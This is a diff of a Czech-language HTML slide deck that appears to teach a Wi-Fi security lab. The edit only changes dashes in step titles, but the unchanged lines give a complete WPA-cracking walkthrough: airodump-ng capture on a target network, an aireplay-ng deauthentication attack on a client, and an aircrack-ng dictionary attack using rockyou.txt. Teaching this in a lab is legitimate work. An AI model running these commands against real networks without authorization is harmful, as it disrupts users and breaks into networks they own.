@@ -68,7 +68,7 @@
 
         <!-- Slide 2: Krok 1 -->
         <section>
-          <div class="step-title">1. Krok — Kontrola síťové karty</div>
+          <div class="step-title">1. Krok - Kontrola síťové karty</div>
           <p style="text-align: left; font-size: 0.85em;">Spusťte příkaz pro ověření stavu bezdrátové karty:</p>
           
           <pre><code class="language-bash code-block">iwconfig</code></pre>
@@ -93,7 +93,7 @@
 
         <!-- Slide 3: Krok 2 -->
         <section>
-          <div class="step-title">2. Krok — Skenování sítí v okolí</div>
+          <div class="step-title">2. Krok - Skenování sítí v okolí</div>
           <p style="text-align: left; font-size: 0.85em;">Spusťte celkové skenování všech rozsahů ve vzduchu:</p>
           
           <pre><code class="language-bash code-block">sudo airodump-ng wlan0mon</code></pre>
@@ -129,7 +129,7 @@
 
         <!-- Slide 4: Krok 3 -->
         <section>
-          <div class="step-title">3. Krok — Zacílení na síť a ukládání paketů</div>
+          <div class="step-title">3. Krok - Zacílení na síť a ukládání paketů</div>
           <p style="text-align: left; font-size: 0.85em;">Příklad příkazu pro zacílení na vybranou síť:</p>
           
           <pre><code class="language-bash code-block">sudo airodump-ng -c 6 --bssid AA:BB:CC:11:22:33 -w pokus wlan0mon</code></pre>
@@ -165,7 +165,7 @@
 
         <!-- Slide 5: Krok 4 -->
         <section>
-          <div class="step-title">4. Krok — Vynucení přihlášení (Deautentizace)</div>
+          <div class="step-title">4. Krok - Vynucení přihlášení (Deautentizace)</div>
           <p style="text-align: left; font-size: 0.85em;">V <strong>DRUHÉM okně terminálu</strong> pošlete deautentizační útok:</p>
           
           <pre><code class="language-bash code-block">sudo aireplay-ng --deauth 5 -a AA:BB:CC:11:22:33 -c 99:88:77:66:55:44 wlan0mon</code></pre>
@@ -200,7 +200,7 @@
 
         <!-- Slide 6: Krok 5 -->
         <section>
-          <div class="step-title">5. Krok — Kontrola zachycení Handshaku</div>
+          <div class="step-title">5. Krok - Kontrola zachycení Handshaku</div>
           <p style="text-align: left; font-size: 0.85em;">Přepněte se do <strong>PRVNÍHO okna</strong> s <code>airodump-ng</code> a sledujte pravý horní roh:</p>
           
           <div class="guide-box" style="border-left-color: #28a745; margin-top: 0.6rem;">
@@ -226,7 +226,7 @@
 
         <!-- Slide 7: Krok 6 -->
         <section>
-          <div class="step-title">6. Krok — Prolomení hesla ze slovníku</div>
+          <div class="step-title">6. Krok - Prolomení hesla ze slovníku</div>
           <p style="text-align: left; font-size: 0.85em;">Spusťte slovníkový útok v nástroji Aircrack-ng:</p>
           
           <pre><code class="language-bash code-block">aircrack-ng -w /usr/share/wordlists/rockyou.txt pokus-01.cap</code></pre>
